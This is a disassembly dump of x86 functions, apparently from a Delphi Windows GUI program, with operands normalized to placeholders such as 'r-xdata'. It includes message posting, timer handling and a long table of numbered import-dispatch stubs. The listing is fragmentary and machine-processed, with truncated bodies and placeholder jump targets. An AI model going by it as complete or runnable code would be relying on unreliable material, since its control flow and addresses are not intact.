sub_460a20
push ebx
mov ebx edx
mov edx ebx
call sub_44c640
and [ ebx + 0x24 ] 0xfffffffc
pop ebx
retn
sub_460a90
cmp [ eax + 0x5c ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x1a8 ] 0x0
je r-xdata
mov al 0x1
retn
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
sub_460bb8
jmp sub_403ae4
sub_460bbf
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_460bc8
push ebx
mov ebx eax
cmp [ ebx + 0x214 ] 0x0
jg r-xdata
pop ebx
retn
mov eax [ ebx + 0x208 ]
call sub_45ffd4
mov eax [ ebx + 0x20c ]
call sub_45ffd4
sub_460c28
push esi
mov esi eax
mov eax [ esi + 0x208 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_460c38
push esi
mov esi eax
mov eax [ esi + 0x20c ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_460d33
jmp sub_403ae4
sub_460d40
test edx edx
je r-xdata
retn
test [ edx + 0x1c ] 0x1
jne r-xdata
test [ eax + 0x1c ] 0x1
jne r-xdata
call sub_460d58
sub_460f74
retn
sub_460fe2
jmp sub_403ae4
sub_461021
jmp sub_403ae4
sub_461054
cmp [ edx + 0x8 ] 0x0
jne r-xdata
call sub_44db38
retn
mov ecx [ eax + 0x208 ]
cmp [ ecx + 0x1c ] 0x0
je r-xdata
mov eax [ eax + 0x208 ]
call sub_460260
retn
sub_461078
cmp [ edx + 0x8 ] 0x0
jne r-xdata
call sub_44db58
retn
mov ecx [ eax + 0x20c ]
cmp [ ecx + 0x1c ] 0x0
je r-xdata
mov eax [ eax + 0x20c ]
call sub_460260
retn
sub_46116d
jmp sub_403ae4
sub_461174
mov eax [ ebp - 0x4 ]
call sub_44fab8
test al al
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_45fec8
mov eax [ ebp - 0x4 ]
call sub_460c48
sub_4612a8
jmp sub_403ae4
sub_4612e0
jmp sub_403ae4
sub_4612e7
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_461307
lea eax [ ebp - 0x114 ]
call sub_404164
retn
sub_461300
jmp sub_403ae4
sub_461307
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
call sub_40370c
pop [ fs : 0x0 ]
add esp 0xc
sub_46160e
jmp sub_403ae4
sub_461615
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_403704
j_sub_403830#6
jmp sub_403830
j_sub_403830#4
jmp sub_403830
sub_4616ea
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_468b5c
call sub_403b98
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_461aa2
jmp sub_403ae4
sub_461aa9
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_461b84
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_41ce58
mov [ ebx + 0x270 ] eax
pop esi
pop ebx
retn
sub_461b9c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_461bd4
mov edx eax
mov eax esi
call sub_41f048
pop esi
pop ebx
retn
sub_461bb8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_462f78
mov edx eax
mov eax esi
call sub_41f048
pop esi
pop ebx
retn
sub_461bd4
push ebx
mov ebx eax
mov eax ebx
call sub_462c18
mov edx r-xdata
call sub_424fe8
pop ebx
retn
sub_461cd8
push ebx
mov ebx eax
mov eax ebx
call sub_461ce8
xor al 0x1
pop ebx
retn
sub_461ce8
cmp [ eax + 0x210 ] 0x0
jne r-xdata
mov al 0x1
retn
mov edx [ eax + 0x208 ]
cmp [ edx + 0x10 ] 0x0
jne r-xdata
mov eax [ eax + 0x20c ]
cmp [ eax + 0x10 ] 0x0
jne r-xdata
xor eax eax
retn
sub_461d44
push ebx
cmp [ eax + 0x292 ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x294 ]
call [ ebx + 0x290 ]
sub_461d64
push ebx
cmp [ eax + 0x2b2 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2b4 ]
call [ ebx + 0x2b0 ]
sub_461d84
push ebx
cmp [ eax + 0x2ca ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2cc ]
call [ ebx + 0x2c8 ]
sub_46207d
jmp sub_403ae4
sub_462084
pop ecx
pop ebp
retn
sub_462088
xor eax eax
retn
sub_462360
jmp sub_403ae4
sub_462367
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_403368
retn
sub_46237d
jmp sub_403ae4
sub_462467
jmp sub_403ae4
sub_46246e
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46248b
mov eax [ ebp - 0xc ]
call sub_403368
retn
sub_462484
jmp sub_403ae4
sub_4624ab
jmp sub_403ae4
sub_462796
jmp sub_403ae4
sub_462929
jmp sub_403ae4
sub_462c18
mov eax [ eax + 0x238 ]
retn
sub_462c20
mov eax [ eax + 0x240 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_462c2c
mov al [ eax + 0x5e ]
xor al 0x1
retn
sub_462f6a
jmp sub_403ae4
sub_462f71
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_462f78
mov eax [ eax + 0x25c ]
test eax eax
jne r-xdata
retn
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
sub_462fc0
cmp dl [ eax + 0x230 ]
je r-xdata
retn
mov [ eax + 0x230 ] dl
test [ eax + 0x1c ] 0x10
jne r-xdata
call sub_44cd54
sub_462fdc
cmp [ eax + 0x25c ] 0x0
setne al
retn
sub_463018
push ebx
mov ebx eax
mov eax ebx
call sub_44ece8
mov eax [ ebx + 0x238 ]
test eax eax
je r-xdata
pop ebx
retn
mov eax [ eax + 0x14 ]
mov edx [ ebx + 0x70 ]
call sub_4249a4
sub_46309c
push ebx
mov ebx eax
mov eax ebx
call sub_44ed10
mov eax [ ebx + 0x238 ]
test eax eax
je r-xdata
pop ebx
retn
mov edx [ ebx + 0x68 ]
call sub_42508c
sub_4630bc
push ebx
mov ebx eax
mov eax ebx
call sub_462cdc
mov edx [ ebx + 0x248 ]
mov eax ebx
call sub_462da4
pop ebx
retn
sub_4638e9
lea eax [ ebp - 0xb4 ]
call sub_404164
retn
sub_4638f5
jmp sub_403ae4
j_sub_4638e9
jmp sub_4638e9
sub_4638fc
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_463a54
jmp sub_403ae4
sub_463a5b
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_463d40
jmp sub_403ae4
sub_463d47
mov eax [ rw-data ]
call sub_4665f8
mov bl 0x1
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_463d5e
add [ eax ] al
retn
sub_463fbc
push ebx
cmp [ eax + 0x2ba ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2bc ]
call [ ebx + 0x2b8 ]
sub_463fdc
mov eax [ eax + 0x240 ]
call sub_429264
test eax eax
jne r-xdata
retn
mov eax [ rw-data ]
call sub_468410
sub_464083
jmp sub_403ae4
sub_46408a
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4640ad
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
call sub_425064
retn
sub_4640a6
jmp sub_403ae4
sub_4640ad
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_46426c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_463fdc
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
sub_4644d4
mov ecx [ eax + 0x248 ]
test ecx ecx
je r-xdata
retn
mov edx [ edx + 0x4 ]
mov eax ecx
call sub_45c2c4
sub_4645bf
jmp sub_403ae4
sub_4645c6
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4645cc
cmp [ eax + 0x22f ] 0x2
jne r-xdata
cmp [ edx + 0x4 ] 0x0
setne dl
call sub_463db4
test [ eax + 0x1c ] 0x10
je r-xdata
retn
sub_464624
call sub_46534c
retn
sub_464a71
jmp sub_403ae4
sub_464a78
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_464d74
jmp sub_403830
sub_465110
jmp sub_403830
sub_465209
jmp sub_403ae4
sub_465210
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46522d
lea eax [ ebp - 0x8 ]
call sub_404164
retn
sub_465226
jmp sub_403ae4
sub_46522d
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_465234
push ebx
mov ebx eax
mov eax [ ebx + 0x240 ]
call sub_429264
test eax eax
jne r-xdata
pop ebx
retn
xor edx edx
mov eax ebx
call sub_461c7c
sub_465254
call sub_403368
retn
sub_4652ac
mov ecx [ eax ]
call [ ecx - 0x10 ]
retn
sub_465312
jmp sub_403ae4
sub_4654c0
jmp sub_403830
sub_4654ec
xor edx edx
call sub_461fe0
retn
sub_4654f4
push ebx
mov ebx eax
mov dl 0x1
mov eax ebx
call sub_461fe0
mov eax ebx
call sub_449214
pop ebx
retn
j_sub_403ae4#3
jmp sub_403ae4
sub_465581
pop ebx
pop ecx
pop ebp
retn
sub_465588
push ebx
mov ebx eax
push 0x0
push 0x0
push 0xb021
mov eax ebx
call sub_44f7b4
push eax
call PostMessageA
pop ebx
retn
sub_46578c
jmp sub_403ae4
sub_46582d
jmp sub_403ae4
sub_465837
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_465856
mov eax [ rw-data ]
call sub_467ae8
retn
sub_46584f
jmp sub_403ae4
sub_465856
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_465873
lea eax [ ebp - 0x20 ]
call sub_404164
retn
sub_46586c
jmp sub_403ae4
sub_465873
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_465954
cmp [ eax + 0x30 ] 0x0
jne r-xdata
call sub_448398
retn
mov edx eax
mov eax [ rw-data ]
call sub_46710c
retn
sub_465cd8
mov edx eax
mov eax [ rw-data ]
call sub_468b5c
mov al 0x1
retn
sub_465dc0
cmp dl [ eax + 0x2e0 ]
je r-xdata
retn
mov [ eax + 0x2e0 ] dl
call sub_465ce8
sub_465dd4
cmp dl [ eax + 0x2e1 ]
je r-xdata
retn
mov [ eax + 0x2e1 ] dl
call sub_465ce8
sub_465de8
cmp edx [ eax + 0x2ec ]
je r-xdata
retn
mov [ eax + 0x2ec ] edx
call sub_465ce8
sub_465dfc
cmp dl [ eax + 0x2e8 ]
je r-xdata
retn
mov [ eax + 0x2e8 ] dl
call sub_465ce8
sub_465e10
test [ eax + 0x1c ] 0x10
jne r-xdata
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ eax + 0x2e0 ] 0x0
jne r-xdata
or [ edx + 0x8 ] 0x80000
cmp [ eax + 0x2e8 ] 0x0
je r-xdata
sub_465f7b
jmp sub_403ae4
sub_465f82
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_465f88
push ebx
mov ebx eax
mov eax ebx
call sub_44e0cc
mov eax ebx
call sub_44e250
test eax eax
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_465588
sub_4661fe
jmp sub_403ae4
sub_466205
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_46620c
push ebx
mov ebx edx
mov edx ebx
call sub_44e534
mov eax [ ebx + 0x8 ]
xor edx edx
call sub_4484a0
pop ebx
retn
sub_466260
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_4662c8
mov eax [ esp ]
add esp 0x10
pop ebx
retn
sub_466278
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_4662c8
mov eax [ esp + 0xc ]
sub eax [ esp + 0x4 ]
add esp 0x10
pop ebx
retn
sub_466294
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_4662c8
mov eax [ esp + 0x4 ]
add esp 0x10
pop ebx
retn
sub_4662ac
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_4662c8
mov eax [ esp + 0x8 ]
sub eax [ esp ]
add esp 0x10
pop ebx
retn
sub_466548
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_466554
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_466560
push 0x4d
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_46656c
push 0x4c
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_466578
push 0x4f
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_466584
push 0x4e
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_4665a4
mov edx [ eax + 0x58 ]
mov edx [ edx + 0x8 ]
test edx edx
jne r-xdata
mov eax edx
retn
push 0x50
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_4665c0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_4188a0
pop esi
pop ebx
retn
sub_4665d4
mov eax [ eax + 0x4c ]
mov eax [ eax + 0x8 ]
retn
sub_4665dc
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_4188a0
pop esi
pop ebx
retn
sub_4665f0
mov eax [ eax + 0x50 ]
mov eax [ eax + 0x8 ]
retn
sub_4666cc
mov eax [ eax + 0x54 ]
call sub_418744
retn
sub_4666d8
mov eax [ eax + 0x54 ]
call sub_418a3c
retn
sub_466973
jmp sub_403ae4
sub_4669b7
jmp sub_403ae4
sub_4669be
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_466a0c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_46680c
mov eax esi
mov edx [ ebx + 0x38 ]
call sub_4041b8
pop esi
pop ebx
retn
sub_466a78
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x54 ]
call sub_4188a0
pop esi
pop ebx
retn
sub_466a8c
mov eax [ eax + 0x54 ]
mov eax [ eax + 0x8 ]
retn
sub_466c91
jmp sub_403ae4
sub_466c98
pop ebx
mov esp ebp
pop ebp
retn
sub_466ca0
inc [ eax + 0x8c ]
retn
sub_466ca8
dec [ eax + 0x8c ]
cmp [ eax + 0x8c ] 0x0
jne r-xdata
retn
test [ eax + 0x8e ] 0x10
je r-xdata
call sub_466cc8
sub_466cc8
xor edx edx
call sub_46710c
retn
sub_4670fe
jmp sub_403ae4
sub_467185
jmp sub_403ae4
sub_467194
add eax 0x30
call sub_40d490
retn
sub_4671d8
jmp r-xdata
test eax eax
je r-xdata
test eax eax
je r-xdata
cmp [ eax + 0x99 ] 0x0
je r-xdata
retn
test [ eax + 0x1c ] 0x10
je r-xdata
mov eax [ eax + 0x30 ]
xor eax eax
sub_467229
jmp sub_403830
sub_46722e
mov edx [ rw-data ]
mov eax [ rw-data ]
call sub_468b5c
call sub_403b98
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_46792d
jmp sub_403ae4
sub_467934
pop ebx
mov esp ebp
pop ebp
retn
sub_467abc
push ebx
inc [ eax + 0xb8 ]
cmp [ eax + 0xb8 ] 0x1
jne r-xdata
pop ebx
retn
cmp [ eax + 0xe2 ] 0x0
je r-xdata
mov ebx eax
mov edx eax
mov eax [ ebx + 0xe4 ]
call [ ebx + 0xe0 ]
sub_467ae8
push ebx
dec [ eax + 0xb8 ]
cmp [ eax + 0xb8 ] 0x0
jne r-xdata
pop ebx
retn
cmp [ eax + 0xea ] 0x0
je r-xdata
mov ebx eax
mov edx eax
mov eax [ ebx + 0xec ]
call [ ebx + 0xe8 ]
sub_467b14
xor edx edx
call sub_467a0c
retn
sub_467b1c
mov dl 0x1
call sub_467a0c
retn
sub_467b90
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x34 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_467ba8
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x34 ] 0x1
je r-xdata
mov al 0x1
retn
sub_467c75
jmp sub_403ae4
sub_467c7c
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4683c6
jmp sub_403830
sub_4689c4
push ebx
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
pop ebx
retn
mov ebx [ rw-data ]
mov ebx [ ebx ]
call ebx
j_sub_403830#7
jmp sub_403830
sub_468b01
jmp sub_403830
sub_468b3a
jmp sub_403ae4
sub_468b41
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_468b48
call sub_40cfe0
test al al
je r-xdata
retn
push 0x0
call PostQuitMessage
sub_468d41
jmp sub_403ae4
sub_468d48
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_468e0f
jmp sub_403ae4
sub_468e16
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_468fec
jmp sub_403ae4
sub_468ff3
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_469054
jmp sub_403ae4
sub_46905b
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_469064
call sub_468e2c
retn
j_sub_403830#5
jmp sub_403830
sub_4692a8
jmp sub_403ae4
sub_4692af
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
j_sub_403ae4#7
jmp sub_403ae4
sub_46953c
push ebx
mov ebx eax
mov ax [ ebx + 0x8a ]
test ax ax
je r-xdata
pop ebx
retn
movzx eax ax
push eax
push 0x0
call KillTimer
mov [ ebx + 0x8a ] 0x0
sub_46983b
jmp sub_403ae4
sub_46986a
jmp sub_403ae4
sub_469976
jmp sub_403ae4
sub_46997d
mov eax [ ebp - 0x4 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_469d0e
jmp sub_403ae4
sub_469d15
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_469e38
push ebx
push r-xdata
call GetModuleHandleA
mov ebx eax
test ebx ebx
je r-xdata
pop ebx
retn
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
sub_469e83
add [ edx ] ch
push 0x0
push 0x0
mov eax [ eax + 0x30 ]
push eax
call PostMessageA
retn
sub_469e94
mov edx [ rw-data ]
mov [ edx + 0x4 ] eax
mov [ edx ] r-xdata
retn
sub_469ea4
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
retn
sub_469f17
jmp sub_403ae4
sub_469f1e
pop ebp
retn
sub_469f20
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax sub_469eb4
call sub_403eb4
call sub_469e38
push r-xdata
call RegisterWindowMessageA
mov [ rw-data ] eax
mov eax sub_45fb6c
call sub_418208
sub_46ab2d
jmp sub_403ae4
sub_46ab34
pop ebp
retn
sub_46ab38
sub [ rw-data ] 0x1
retn
sub_46ae25
jmp sub_403ae4
sub_46ae2c
pop ebp
retn
sub_46ae30
sub [ rw-data ] 0x1
retn
sub_46af50
jmp sub_403ae4
sub_46af88
push 0x0
push rw-data
call InterlockedExchange
test eax eax
je r-xdata
retn
push eax
call FreeLibrary
call sub_46bde8
sub_46afa4
mov eax 0x0
call sub_46bd34
jmp eax
sub_46afb0
retn
sub_46afb4
mov eax 0x1
call sub_46bd34
jmp eax
sub_46afc0
retn
sub_46afc4
mov eax 0x2
call sub_46bd34
jmp eax
sub_46afd0
retn
sub_46afd4
mov eax 0x3
call sub_46bd34
jmp eax
sub_46afe0
retn
sub_46afe4
mov eax 0x4
call sub_46bd34
jmp eax
sub_46aff0
retn
sub_46aff4
mov eax 0x5
call sub_46bd34
jmp eax
sub_46b000
retn
sub_46b004
mov eax 0x6
call sub_46bd34
jmp eax
sub_46b010
retn
sub_46b014
mov eax 0x7
call sub_46bd34
jmp eax
sub_46b020
retn
sub_46b024
mov eax 0x8
call sub_46bd34
jmp eax
sub_46b030
retn
sub_46b034
mov eax 0x9
call sub_46bd34
jmp eax
sub_46b040
retn
sub_46b044
mov eax 0xa
call sub_46bd34
jmp eax
sub_46b050
retn
sub_46b054
mov eax 0xb
call sub_46bd34
jmp eax
sub_46b060
retn
sub_46b064
mov eax 0xc
call sub_46bd34
jmp eax
sub_46b070
retn
sub_46b074
mov eax 0xd
call sub_46bd34
jmp eax
sub_46b080
retn
sub_46b084
mov eax 0xe
call sub_46bd34
jmp eax
sub_46b090
retn
sub_46b094
mov eax 0xf
call sub_46bd34
jmp eax
sub_46b0a0
retn
sub_46b0a4
mov eax 0x10
call sub_46bd34
jmp eax
sub_46b0b0
retn
sub_46b0b4
mov eax 0x11
call sub_46bd34
jmp eax
sub_46b0c0
retn
sub_46b0c4
mov eax 0x12
call sub_46bd34
jmp eax
sub_46b0d0
retn
sub_46b0d4
mov eax 0x13
call sub_46bd34
jmp eax
sub_46b0e0
retn
sub_46b0e4
mov eax 0x14
call sub_46bd34
jmp eax
sub_46b0f0
retn
sub_46b0f4
mov eax 0x15
call sub_46bd34
jmp eax
sub_46b100
retn
sub_46b104
mov eax 0x16
call sub_46bd34
jmp eax
sub_46b110
retn
sub_46b114
mov eax 0x17
call sub_46bd34
jmp eax
sub_46b120
retn
sub_46b124
mov eax 0x18
call sub_46bd34
jmp eax
sub_46b130
retn
sub_46b134
mov eax 0x19
call sub_46bd34
jmp eax
sub_46b140
retn
sub_46b144
mov eax 0x1a
call sub_46bd34
jmp eax
sub_46b150
retn
sub_46b154
mov eax 0x1b
call sub_46bd34
jmp eax
sub_46b160
retn
sub_46b164
mov eax 0x1c
call sub_46bd34
jmp eax
sub_46b170
retn
sub_46b174
mov eax 0x1d
call sub_46bd34
jmp eax
sub_46b180
retn
sub_46b184
mov eax 0x1e
call sub_46bd34
jmp eax
sub_46b190
retn
sub_46b194
mov eax 0x1f
call sub_46bd34
jmp eax
sub_46b1a0
retn
sub_46b1a4
mov eax 0x20
call sub_46bd34
jmp eax
sub_46b1b0
retn
sub_46b1b4
mov eax 0x21
call sub_46bd34
jmp eax
sub_46b1c0
retn
sub_46b1c4
mov eax 0x22
call sub_46bd34
jmp eax
sub_46b1d0
retn
sub_46b1d4
mov eax 0x23
call sub_46bd34
jmp eax
sub_46b1e0
retn
sub_46b1e4
mov eax 0x24
call sub_46bd34
jmp eax
sub_46b1f0
retn
sub_46b1f4
mov eax 0x25
call sub_46bd34
jmp eax
sub_46b200
retn
sub_46b204
mov eax 0x26
call sub_46bd34
jmp eax
sub_46b210
retn
sub_46b214
mov eax 0x27
call sub_46bd34
jmp eax
sub_46b220
retn
sub_46b224
mov eax 0x28
call sub_46bd34
jmp eax
sub_46b230
retn
sub_46b234
mov eax 0x29
call sub_46bd34
jmp eax
sub_46b240
retn
sub_46b244
mov eax 0x2a
call sub_46bd34
jmp eax
sub_46b250
retn
sub_46b254
mov eax 0x2b
call sub_46bd34
jmp eax
sub_46b260
retn
sub_46b264
mov eax 0x2c
call sub_46bd34
jmp eax
sub_46b270
retn
sub_46b274
mov eax 0x2d
call sub_46bd34
jmp eax
sub_46b280
retn
sub_46b284
mov eax 0x2e
call sub_46bd34
jmp eax
sub_46b290
retn
sub_46b294
mov eax 0x2f
call sub_46bd34
jmp eax
sub_46b2a0
retn
sub_46b2a4
mov eax 0x30
call sub_46bd34
jmp eax
sub_46b2b0
retn
sub_46b2b4
mov eax 0x31
call sub_46bd34
jmp eax
sub_46b2c0
retn
sub_46b2c4
mov eax 0x32
call sub_46bd34
jmp eax
sub_46b2d0
retn
sub_46b2d4
mov eax 0x33
call sub_46bd34
jmp eax
sub_46b2e0
retn
sub_46b2e4
mov eax 0x34
call sub_46bd34
jmp eax
sub_46b2f0
retn
sub_46b2f4
mov eax 0x35
call sub_46bd34
jmp eax
sub_46b300
retn
sub_46b304
mov eax 0x36
call sub_46bd34
jmp eax
sub_46b310
retn
sub_46b314
mov eax 0x37
call sub_46bd34
jmp eax
sub_46b320
retn
sub_46b324
mov eax 0x38
call sub_46bd34
jmp eax
sub_46b330
retn
sub_46b334
mov eax 0x39
call sub_46bd34
jmp eax
sub_46b340
retn
sub_46b344
mov eax 0x3a
call sub_46bd34
jmp eax
sub_46b350
retn
sub_46b354
mov eax 0x3b
call sub_46bd34
jmp eax
sub_46b360
retn
sub_46b364
mov eax 0x3c
call sub_46bd34
jmp eax
sub_46b370
retn
sub_46b374
mov eax 0x3d
call sub_46bd34
jmp eax
sub_46b380
retn
sub_46b384
mov eax 0x3e
call sub_46bd34
jmp eax
sub_46b390
retn
sub_46b394
mov eax 0x3f
call sub_46bd34
jmp eax
sub_46b3a0
retn
sub_46b3a4
mov eax 0x40
call sub_46bd34
jmp eax
sub_46b3b0
retn
sub_46b3b4
mov eax 0x41
call sub_46bd34
jmp eax
sub_46b3c0
retn
sub_46b3c4
mov eax 0x42
call sub_46bd34
jmp eax
sub_46b3d0
retn
sub_46b3d4
mov eax 0x43
call sub_46bd34
jmp eax
sub_46b3e0
retn
sub_46b3e4
mov eax 0x44
call sub_46bd34
jmp eax
sub_46b3f0
retn
sub_46b3f4
mov eax 0x45
call sub_46bd34
jmp eax
sub_46b400
retn
sub_46b404
mov eax 0x46
call sub_46bd34
jmp eax
sub_46b410
retn
sub_46b414
mov eax 0x47
call sub_46bd34
jmp eax
sub_46b420
retn
sub_46b424
mov eax 0x48
call sub_46bd34
jmp eax
sub_46b430
retn
sub_46b434
mov eax 0x49
call sub_46bd34
jmp eax
sub_46b440
retn
sub_46b444
mov eax 0x4a
call sub_46bd34
jmp eax
sub_46b450
retn
sub_46b454
mov eax 0x4b
call sub_46bd34
jmp eax
sub_46b460
retn
sub_46b464
mov eax 0x4c
call sub_46bd34
jmp eax
sub_46b470
retn
sub_46b474
mov eax 0x4d
call sub_46bd34
jmp eax
sub_46b480
retn
sub_46b484
mov eax 0x4e
call sub_46bd34
jmp eax
sub_46b490
retn
sub_46b494
mov eax 0x4f
call sub_46bd34
jmp eax
sub_46b4a0
retn
sub_46b4a4
mov eax 0x50
call sub_46bd34
jmp eax
sub_46b4b0
retn
sub_46b4b4
mov eax 0x51
call sub_46bd34
jmp eax
sub_46b4c0
retn
sub_46b4c4
mov eax 0x52
call sub_46bd34
jmp eax
sub_46b4d0
retn
sub_46b4d4
mov eax 0x53
call sub_46bd34
jmp eax
sub_46b4e0
retn
sub_46b4e4
mov eax 0x54
call sub_46bd34
jmp eax
sub_46b4f0
retn
sub_46b4f4
mov eax 0x55
call sub_46bd34
jmp eax
sub_46b500
retn
sub_46b504
mov eax 0x56
call sub_46bd34
jmp eax
sub_46b510
retn
sub_46b514
mov eax 0x57
call sub_46bd34
jmp eax
sub_46b520
retn
sub_46b524
mov eax 0x58
call sub_46bd34
jmp eax
sub_46b530
retn
sub_46b534
mov eax 0x59
call sub_46bd34
jmp eax
sub_46b540
retn
sub_46b544
mov eax 0x5a
call sub_46bd34
jmp eax
sub_46b550
retn
sub_46b554
mov eax 0x5b
call sub_46bd34
jmp eax
sub_46b560
retn
sub_46b564
mov eax 0x5c
call sub_46bd34
jmp eax
sub_46b570
retn
sub_46b574
mov eax 0x5d
call sub_46bd34
jmp eax
sub_46b580
retn
sub_46b584
mov eax 0x5e
call sub_46bd34
jmp eax
sub_46b590
retn
sub_46b594
mov eax 0x5f
call sub_46bd34
jmp eax
sub_46b5a0
retn
sub_46b5a4
mov eax 0x60
call sub_46bd34
jmp eax
sub_46b5b0
retn
sub_46b5b4
mov eax 0x61
call sub_46bd34
jmp eax
sub_46b5c0
retn
sub_46b5c4
mov eax 0x62
call sub_46bd34
jmp eax
sub_46b5d0
retn
sub_46b5d4
mov eax 0x63
call sub_46bd34
jmp eax
sub_46b5e0
retn
sub_46b5e4
mov eax 0x64
call sub_46bd34
jmp eax
sub_46b5f0
retn
sub_46b5f4
mov eax 0x65
call sub_46bd34
jmp eax
sub_46b600
retn
sub_46b604
mov eax 0x66
call sub_46bd34
jmp eax
sub_46b610
retn
sub_46b614
mov eax 0x67
call sub_46bd34
jmp eax
sub_46b620
retn
sub_46b624
mov eax 0x68
call sub_46bd34
jmp eax
sub_46b630
retn
sub_46b634
mov eax 0x69
call sub_46bd34
jmp eax
sub_46b640
retn
sub_46b644
mov eax 0x6a
call sub_46bd34
jmp eax
sub_46b650
retn
sub_46b654
mov eax 0x6b
call sub_46bd34
jmp eax
sub_46b660
retn
sub_46b664
mov eax 0x6c
call sub_46bd34
jmp eax
sub_46b670
retn
sub_46b674
mov eax 0x6d
call sub_46bd34
jmp eax
sub_46b680
retn
sub_46b684
mov eax 0x6e
call sub_46bd34
jmp eax
sub_46b690
retn
sub_46b694
mov eax 0x6f
call sub_46bd34
jmp eax
sub_46b6a0
retn
sub_46bdd7
jmp sub_403ae4
sub_46bdde
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46bed9
jmp sub_403ae4
sub_46bee0
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_46bf44
jmp sub_403ae4
sub_46bf4b
